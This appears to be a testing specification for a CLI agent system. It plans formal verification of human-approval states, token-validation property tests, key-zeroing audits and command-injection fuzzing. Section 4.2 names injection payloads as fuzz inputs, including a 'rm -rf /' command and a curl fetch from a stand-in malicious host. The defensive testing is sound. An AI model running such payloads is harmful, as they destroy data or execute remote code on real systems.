# Test Infrastructure Specification: OpenClaw CLI Ultrathink Formalization

**Version**: 2.0.0
**Date**: 2026-04-08
**Classification**: TESTING FRAMEWORK / FORMAL VERIFICATION

## 1. Overview
Standard unit testing is insufficient for SIL-6 compliance. This document outlines the formal verification and property-based testing infrastructure required to guarantee the safety of the CLI enhancements.

## 2. Formal Verification (TLA+ / Apalache)

### 2.1 HITL Deadlock Verification
To ensure the OODA loop cannot permanently deadlock while awaiting human approval (SC-CLI-011, FMEA RPN 60).

*   **TLA+ Specification**: We will model the `CortexState` transitions (`Active` $\leftrightarrow$ `AwaitingApproval`).
*   **Temporal Invariant**: `[] (AwaitingApproval => <> (Active \/ Terminated))`
*   **Verification**: Use the Apalache model checker to prove that for all possible interleavings of Zenoh intents, timeouts, and user approvals, the Cortex always eventually exits the `AwaitingApproval` state.

## 3. Gleam Property Testing (PropCheck)

### 3.1 Cryptographic Intent Validation
*   **Target**: `cepaf_gleam/security/hitl_validator.gleam`
*   **Property**: For all generated Approval Tokens $T$, the function `verify_approval(T)` returns `True` if and only if $T$ was signed by the authorized Private Key and $T_{timestamp}$ is within the $\tau_{valid}$ window.
*   **Generators**:
    *   Valid tokens with recent timestamps.
    *   Valid tokens with expired timestamps (must fail).
    *   Tokens with altered payloads but valid signatures (must fail).
    *   Random byte noise (must fail without crashing).

## 4. Rust Motor Strip Security Audits

### 4.1 Zeroize Memory Audits
*   **Target**: `sa-plan-daemon/src/security/crypto.rs`
*   **Mechanism**: Execute tests using `valgrind` or custom memory dumpers to ensure that immediately after a `sa-plan secrets set` operation completes, the raw string representation of the API key is overwritten with zeros in RAM.
*   **Assertion**: `assert_eq!(memory_scan(process_id, "API_KEY_STRING"), 0)`.

### 4.2 Command Injection Fuzzing
*   **Target**: `mcp_sys::handle_exec`
*   **Mechanism**: Use `cargo fuzz` to blast the `exec` handler with malformed, malicious bash payloads (e.g., `"; rm -rf /"`, `$(curl malicious.com/script.sh)`).
*   **Assertion**: The system must correctly identify these as requiring HITL approval, or securely wrap them in the Podman sandbox, preventing any alteration to the host filesystem outside of `$WORKSPACE_ROOT`.
